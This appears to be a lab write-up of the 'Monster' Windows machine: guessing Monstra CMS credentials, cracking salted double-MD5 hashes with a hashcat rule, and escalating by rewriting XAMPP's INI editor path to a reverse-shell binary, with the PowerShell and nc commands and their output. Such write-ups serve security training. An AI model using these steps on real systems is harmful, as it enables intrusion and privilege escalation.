#Windows #MonstraCMS #MD5 #hashcat #RDP #XAMPP #ServiceHijack #CredentialHunting

## Overview

Monster is a Windows machine running a Monstra 3.0.4 CMS over XAMPP. The foothold involves guessing weak admin credentials, extracting a salted double-MD5 hash from a CMS backup, and cracking it with a custom hashcat rule to recover a second user's password for RDP access. Privilege escalation exploits an insecure path in XAMPP's control panel INI file (searchsploit 50377 adapted to version 7.3.10), which lets a low-privileged user redirect the editor binary to a malicious payload that runs as administrator.

## Recon

### Web Enumeration

The web server ran Apache 2.4.41 on Windows with PHP 7.3.10. Directory brute-force revealed `/blog`, which redirected to `monster.pg`, added to `/etc/hosts`. That path served a Monstra CMS login panel.

> **Why adding the hostname to `/etc/hosts` matters:** virtual hosting means the web server returns different content depending on the `Host:` header. Without the correct hostname, you hit a default page; with it, you reach the real application. Never skip this step when a redirect reveals a domain name.

## Foothold

### Monstra CMS, Admin Access via Weak Credentials

Monstra 3.0.4 was the target. After gathering context from the site, credential guessing with related terms produced a hit:

```
admin : wazowski
```

The CMS admin panel was now accessible.

### Extracting and Cracking the Salted Hash

The CMS admin panel included a "Create Backup" function. The resulting zip contained `users.table.xml` at:

```
C:/xampp/htdocs/blog/storage/database/
```

Extracted user entries:

```
admin  : a2b4e80cd640aaa6e417febe095dcbfc  (wazowski@monster.pg)
mike   : 844ffc2c7150b93c4133a6ff2e1a2dba  (mike@monster.pg)
```

The hashes appeared to be MD5 but resisted standard cracking. Checking the Monstra source revealed the hashing scheme:

```php
// defines.php
define('MONSTRA_PASSWORD_SALT', 'YOUR_SALT_HERE');

// hash function
return md5(md5(trim($password) . MONSTRA_PASSWORD_SALT));
```

This is double-MD5 with a known salt appended. Hashcat mode 2600 handles `md5(md5($pass))`. The salt is appended to the wordlist entries using a rule file, where `_` is escaped as `\x5F`:

```
$Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E
```

> **Why hashcat rules let you crack salted double-MD5:** a rule file tells hashcat to transform each candidate password before hashing. Here, appending the known salt string to every rockyou entry reconstructs the exact input `md5()` received. Mode 2600 then handles the double-MD5 computation. This is why knowing the salt and algorithm matters, the crack becomes a dictionary attack again, not a brute-force.

Running hashcat against mike's hash:

```sh
hashcat -m 2600 hash.txt --wordlist /usr/share/wordlists/rockyou.txt -r rule.txt
844ffc2c7150b93c4133a6ff2e1a2dba:Mike14YOUR_SALT_HERE
```

Recovered password:

```
mike : ‹redacted›
```

RDP access confirmed:

```sh
xfreerdp /u:"mike" /p:"‹redacted›" /v:192.168.114.180
```

## Privilege Escalation

### XAMPP Control Panel Editor Path Hijack (searchsploit 50377)

WinPEAS surfaced the XAMPP Apache process running:

```
C:\xampp\apache\bin\httpd.exe
```

XAMPP version 7.3.10. ExploitDB 50377 targets XAMPP 7.4.3 but the same logic applies to 7.3.10. The `xampp-control.ini` file stores the path to the editor binary launched by the XAMPP control panel, and that file is writable by non-admin users.

Checking the INI:

```powershell
PS C:\users\Mike\Desktop> type C:\xampp\xampp-control.ini
[Common]
Edition=
Editor=notepad.exe
```

Replacing the editor path with a malicious reverse-shell exe:

```powershell
$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
$replace = "C:\Users\mike\Desktop\shell.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```

Verifying the change:

```powershell
PS C:\users\Mike\Desktop> type C:\xampp\xampp-control.ini
[Common]
Edition=
Editor=C:\Users\mike\Desktop\shell.exe
```

> **How the INI editor path becomes code execution:** the XAMPP control panel reads this INI on startup and calls the configured editor path when an admin clicks "Edit config." If the control panel runs with elevated privileges, as it typically does when launched from a privileged context or scheduled task, then whatever binary sits at the `Editor=` path runs with that elevated token. Writing a shell path there turns a config option into a privilege escalation primitive.

After waiting for an admin to interact with the control panel, the shell connected back:

```sh
sudo rlwrap nc -lvnp 80
connect to [192.168.45.172] from (UNKNOWN) [192.168.114.180] 50438

C:\WINDOWS\system32>whoami
mike-pc\administrator
```

## Root / SYSTEM

```powershell
C:\Users\Administrator\Desktop>type proof.txt
‹redacted›
```

## Takeaways

- **CMS backup functions are goldmines.** An admin "export" option handed over the entire user table, including all password hashes and salts.
- **Knowing the hash algorithm converts salted hashes into a tractable dictionary attack.** The Monstra source code is public; reading it reduced the problem from "salted MD5" (hard) to "double-MD5 with known salt" (easy with the right hashcat rule).
- **XAMPP's control INI is a writable escalation path on shared-host installs.** Any `Editor=` value in `xampp-control.ini` that a low-priv user can overwrite becomes privilege escalation if an admin process ever reads and acts on it.
